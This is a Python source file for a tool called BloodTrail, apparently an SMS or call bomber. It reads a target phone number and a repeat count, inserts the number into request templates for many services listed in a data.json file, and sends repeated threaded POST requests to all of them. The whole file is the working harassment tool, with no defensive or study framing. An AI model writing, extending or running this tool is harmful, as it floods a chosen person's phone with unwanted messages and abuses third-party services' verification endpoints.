from threading import Thread
import requests
import json
import sys

__version__ = "1.3"


class BloodTrail:
    def __init__(self, number):
        try:
            with open("data.json", "r", encoding="utf-8") as f:
                self.data = json.load(f)
            if number == "":
                if self.data["last_used_number"]:
                    self.number = self.data["last_used_number"]
                    print(f"{'USING LATEST NUMBER :': >40} {self.data['last_used_number']}")
                else:
                    print(f"{'ERROR :': >40} write number as a target to save it")
                    sys.exit()
            else:
                self.number = number
                self.data["last_used_number"] = self.number
                with open("data.json", "w", encoding="utf-8") as j:
                    json.dump(obj=self.data, fp=j, ensure_ascii=False, indent=4)
        except FileNotFoundError:
            print(f"ERROR: data.json file not found.")
            sys.exit()

    def format_data(self):
        for service in self.data["services"]:
            for k, v in self.data["services"][service]["data"].items():
                if "%NUMBER%" in v:
                    v = v.replace("%NUMBER%", self.number[int(self.data["services"][service]["phone_f"]):])
                    self.data["services"][service]["data"][k] = v

    @staticmethod
    def post_request(service, url, data=None, json_data=None):
        if json_data:
            r = requests.post(url=url, json=json_data)
        else:
            r = requests.post(url=url, data=data)
        print(f"{'REQUEST STATUS OF ' + service + ' :': >40} {r.status_code}")

    def start_threads(self, repeats=1):
        threads = []
        for i in range(repeats):
            for service in self.data["services"]:
                data_type = self.data["services"][service]["data_type"]
                if data_type == "json":
                    t = Thread(target=self.post_request, args=(service,
                                                               self.data["services"][service]["url"],
                                                               None,
                                                               self.data["services"][service]["data"]))
                else:
                    t = Thread(target=self.post_request, args=(service,
                                                               self.data["services"][service]["url"],
                                                               self.data["services"][service]["data"],
                                                               None))
                threads.append(t)
                t.start()

        for thread in threads:
            thread.join()


if __name__ == '__main__':
    bloodtrail = BloodTrail(input(f"{'BLOODTRAIL :': >40} {__version__}\n{'TARGET NUMBER :': >40} "))
    bloodtrail.format_data()
    bloodtrail.start_threads((int(input(f"{'REPEATS COUNT :': >40} "))))
